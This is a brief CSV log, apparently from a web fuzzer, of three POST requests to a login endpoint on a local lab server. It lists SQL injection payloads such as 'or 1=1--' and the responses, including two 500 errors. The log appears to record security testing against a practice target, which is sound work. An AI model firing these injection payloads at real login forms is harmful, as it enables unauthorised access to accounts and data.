110,Fuzzed,Mon Jun 01 18:35:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,99,447,36,332,26,,,[' -- ]
112,Fuzzed,Mon Jun 01 18:35:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,447,41,286,1109,,,"["" or 1=1--]"
116,Fuzzed,Mon Jun 01 18:37:25 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,17638,447,42,286,1109,,,"["" or ""a""=""a]"
